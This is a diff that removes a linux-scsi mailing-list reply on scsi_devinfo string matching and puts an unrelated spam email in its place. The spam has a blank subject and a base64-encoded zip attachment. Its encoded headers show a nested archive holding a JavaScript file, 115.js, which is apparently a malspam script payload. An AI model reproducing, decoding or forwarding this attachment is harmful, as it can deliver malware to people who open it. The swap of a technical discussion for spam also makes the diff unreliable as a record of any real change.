@@ -1,116 +1,67 @@
-From: Hannes Reinecke <hare@suse.de>
-Subject: Re: [PATCH 2/4] scsi_devinfo: fixup string compare
-Date: Tue, 8 Aug 2017 18:14:37 +0200
-Message-ID: <9d0af77d-04c2-e859-3025-fa3a5052444d@suse.de>
-References: <Pine.LNX.4.44L0.1708081150250.2055-100000@iolanthe.rowland.org>
- <1502208714.2250.3.camel@wdc.com>
+From: <eaya@otenet.gr>
+Subject: (unknown)
+Date: Tue, 08 Aug 2017 19:14:10 -0000
+Message-ID: <150221965038.17373.1955889958367200452@isurgut.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="496397636536.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from mx2.suse.de ([195.135.220.15]:41194 "EHLO mx1.suse.de"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1752104AbdHHQOj (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
-        Tue, 8 Aug 2017 12:14:39 -0400
-In-Reply-To: <1502208714.2250.3.camel@wdc.com>
-Content-Language: en-US
+Received: from 188-19-15-224.pppoe-adsl.isurgut.ru ([188.19.15.224]:43898 "HELO
+        isurgut.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752289AbdHHTOO (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Tue, 8 Aug 2017 15:14:14 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: Bart Van Assche <Bart.VanAssche@wdc.com>, "stern@rowland.harvard.edu" <stern@rowland.harvard.edu>
-Cc: "hch@lst.de" <hch@lst.de>, "james.bottomley@hansenpartnership.com" <james.bottomley@hansenpartnership.com>, "linux-scsi@vger.kernel.org" <linux-scsi@vger.kernel.org>, "hare@suse.com" <hare@suse.com>, "martin.petersen@oracle.com" <martin.petersen@oracle.com>
+To: linux-scsi@vger.kernel.org
 
-On 08/08/2017 06:11 PM, Bart Van Assche wrote:
-> On Tue, 2017-08-08 at 12:06 -0400, Alan Stern wrote:
->> On Tue, 8 Aug 2017, Hannes Reinecke wrote:
->>> On 08/08/2017 05:25 PM, Alan Stern wrote:
->>>> On Tue, 8 Aug 2017, Hannes Reinecke wrote:
->>>>
->>>>> When checking the model and vendor string we need to use the
->>>>> minimum value of either string, otherwise we'll miss out on
->>>>> wildcard matches.
->>>>> And we should avoid matching anything with zero size as this
->>>>> match will be incorrect.
->>>>> Without this patch certain Hitachi arrays will not be presenting
->>>>> VPD pages correctly.
->>>>>
->>>>> Fixes: 5e7ff2c ("SCSI: fix new bug in scsi_dev_info_list string
->>>>> matching")
->>>>> Signed-off-by: Hannes Reinecke <hare@suse.com>
->>>>
->>>> This is very questionable.  As described in commit b704f70ce200
->>>> ("SCSI: 
->>>> fix bug in scsi_dev_info_list matching"), there are devices which
->>>> have 
->>>> vendor or model strings of length 0, and there are entries in the 
->>>> global device list like that too.  With this patch, such devices and 
->>>> such entries would never match anything.
->>>>
->>>> Also, the idea of using the minimum length of either string doesn't 
->>>> sound right.  It would allow a device with string "abc" to match an 
->>>> entry in the list with string "abcd", which would be wrong.
->>>>
->>>> Suggestion:
->>>>
->>>> 	Allow a device string to match a list entry if the lengths
->>>> 	are equal or the list entry is shorter (this would be a 
->>>> 	wildcard match), but not if the list entry is longer.  Here
->>>> 	the device string length is after leading and trailing blanks
->>>> 	have been removed.
->>>>
->>>> 	As a corollary, allow an empty device string to match an empty 
->>>> 	list entry but nothing else.
->>>>
->>>> Alan Stern
->>>>
->>>
->>> Well, so far we haven't encountered any of those devices.
->>
->> But what if we do in the future?  The code should be correct for 
->> anything.
->>
->>> I _have_ validated the patch with the known problematic inquiry strings,
->>> namely
->>>
->>> "HITACHI" "OPEN-V"
->>> "Inateck" "       "
->>> "       " "Scanner"
->>> "Promise" "STEX"
->>>
->>> and it gives the correct result for all of these.
->>
->> How can "       " "Scanner" give the correct result?  Oh, I see -- the 
->> patch description and the code comment both say that empty strings 
->> never match, but in fact they do -- you allow a match if either the 
->> vendor or model string is empty, but not if they are both empty.
->>
->>> If you have any inquiry strings for which this does _not_ produce the
->>> correct result please let me know.
->>
->> What about "HITA" "OPEN-V"?  Or "" "OPEN-V"?  Both of these will match
->> the "HITACHI" "OPEN-" entry, but neither of them should.
->>
->> What about "ABCD" "Scanner"?  This will match the "        " "Scanner" 
->> entry, but it shouldn't.
-> 
-> Hello Hannes,
-> 
-> Is there any case for which you think it is useful to perform a prefix match
-> on the vendor name? What would break if the code for comparing the vendor
-> name would be changed into an exact match (after having trimmed trailing
-> whitespace)?
-> 
-Haen't thought about this; but sure, it would simplify things here.
-Plus the vendor string typically is short enough so that people don't
-feel the need to abbreviate it.
-
-I'll check.
-
-Cheers,
-
-Hannes
--- 
-Dr. Hannes Reinecke		   Teamlead Storage & Networking
-hare@suse.de			               +49 911 74053 688
-SUSE LINUX GmbH, Maxfeldstr. 5, 90409 Nürnberg
-GF: F. Imendörffer, J. Smithard, J. Guild, D. Upmanyu, G. Norton
-HRB 21284 (AG Nürnberg)
+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
